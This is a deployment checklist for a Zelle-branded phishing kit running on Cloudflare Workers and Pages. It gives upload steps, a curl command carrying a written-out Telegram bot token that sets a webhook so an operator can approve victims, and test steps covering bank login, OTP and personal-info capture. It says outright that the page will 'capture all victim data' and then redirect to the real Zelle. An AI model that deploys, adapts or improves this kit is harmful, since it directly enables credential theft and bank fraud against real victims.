# 📦 FILES TO UPLOAD - CLOUDFLARE DEPLOYMENT

## 🔥 CLOUDFLARE WORKER

**Location:** https://dash.cloudflare.com → Workers & Pages → `zelle-worker`

**Action:** Replace entire worker code with:

```
zelle-cloudflare-worker/worker.js
```

Click **"Save and Deploy"**

---

## 🌐 CLOUDFLARE PAGES

**Location:** https://dash.cloudflare.com → Workers & Pages → Your Pages Project

**Action:** Upload these files to the `zelle/` directory:

### **Files to Upload:**

```
zelle-cpanel-deploy/
├── index.html                    ⭐ (updated - includes extended flow)
├── zelle.html                    ✅ (unchanged - iframe wrapper)
├── zelle-app.html                ⭐ (updated - includes extended flow)
├── bank-logo-fix.js              ✅ (unchanged - bank logo fix)
├── zelle-extended-flow.js        🆕 NEW! - Multi-step flow logic
├── server.php                    ✅ (unchanged - for localhost only)
└── assets/
    ├── index-D-jAnAhO.js         ✅ (unchanged - React app)
    └── index-D-AmrB3w.css        ✅ (unchanged - styles)
```

**Legend:**
- 🆕 = New file (must upload)
- ⭐ = Updated file (must re-upload)
- ✅ = Unchanged (can skip if already uploaded)

---

## ⚡ QUICK UPLOAD CHECKLIST

### **Must Upload (Critical):**
1. ✅ `zelle-extended-flow.js` - The entire multi-step flow
2. ✅ `index.html` - Updated to load extended flow
3. ✅ `zelle-app.html` - Updated to load extended flow
4. ✅ `worker.js` - Backend with new endpoints

### **Should Upload (Recommended):**
5. ✅ `bank-logo-fix.js` - Bank logo fix
6. ✅ `assets/` folder - React app + CSS

### **Optional (Not Required):**
7. `server.php` - Only needed for localhost testing
8. `zelle.html` - Only if using iframe wrapper
9. Documentation files (`.md` files) - Not needed for production

---

## 🧪 VERIFY AFTER UPLOAD

### **1. Test Worker Endpoints**

Open these URLs in browser (replace with your Worker URL):

```
https://zelle-worker.thebighandle.workers.dev/api/zelle-payment
```

**Expected:** JSON response like `{"status":"ok","payment":{...}}`

---

### **2. Test Pages**

Open your Pages URL:

```
https://solitary-fog-56a9.thebighandle.workers.dev/
```

**Expected:**
- Bank selector loads ✅
- Search works ✅
- Bank logos show ✅
- Can select bank and proceed ✅

---

### **3. Test Telegram Webhook**

Run this command:

```bash
curl -X POST "https://api.telegram.org/bot5787969678:AAHZEGiwGsdH8o_70cMIKqIJcNyDExKfQ00/setWebhook" -d "url=https://zelle-worker.thebighandle.workers.dev/telegram-webhook"
```

**Expected:** `{"ok":true,"result":true}`

---

### **4. Test Full Flow**

1. Visit your Pages URL
2. Select a bank
3. Enter credentials
4. Enter OTP
5. Check Telegram for Approve/Decline buttons
6. Click Approve
7. Verify modals appear in order:
   - Account Restricted → Personal Info → Email Verification → Final OTP → Success

---

## 📁 FILE STRUCTURE (After Upload)

Your Cloudflare Pages should look like this:

```
/ (root)
├── index.html
├── zelle.html
├── zelle-app.html
├── bank-logo-fix.js
├── zelle-extended-flow.js
└── assets/
    ├── index-D-jAnAhO.js
    └── index-D-AmrB3w.css
```

**DO NOT upload:**
- `.md` files (documentation)
- `server.php` (only for localhost)
- Any backup or test files

---

## ⚠️ COMMON MISTAKES

### **Mistake 1: Forgot to upload `zelle-extended-flow.js`**
**Result:** Approve/Decline buttons don't trigger anything
**Fix:** Upload `zelle-extended-flow.js`

---

### **Mistake 2: Forgot to update Worker**
**Result:** Personal info/email/final OTP not captured
**Fix:** Replace Worker code with updated `worker.js`

---

### **Mistake 3: Forgot to set Telegram webhook**
**Result:** Buttons don't respond
**Fix:** Run webhook setup command (see above)

---

### **Mistake 4: Uploaded to wrong folder**
**Result:** 404 errors
**Fix:** Make sure files are in root or correct subfolder

---

### **Mistake 5: Didn't update `index.html` and `zelle-app.html`**
**Result:** Extended flow not loaded
**Fix:** Re-upload updated HTML files

---

## ✅ DEPLOYMENT DONE!

Once uploaded, your phishing page will:

1. ✅ Load correctly at your Cloudflare Pages URL
2. ✅ Send all notifications to Telegram
3. ✅ Show Approve/Decline buttons
4. ✅ Trigger multi-step flow on approval
5. ✅ Capture all victim data
6. ✅ Redirect to real Zelle after completion

**Test it thoroughly before sharing!**

---

## 🆘 NEED HELP?

See these guides:
- `DEPLOYMENT-GUIDE.md` - Full deployment walkthrough
- `TELEGRAM-WEBHOOK-SETUP.md` - Webhook setup
- `SUMMARY.md` - Complete overview

**You're ready to deploy! 🚀**
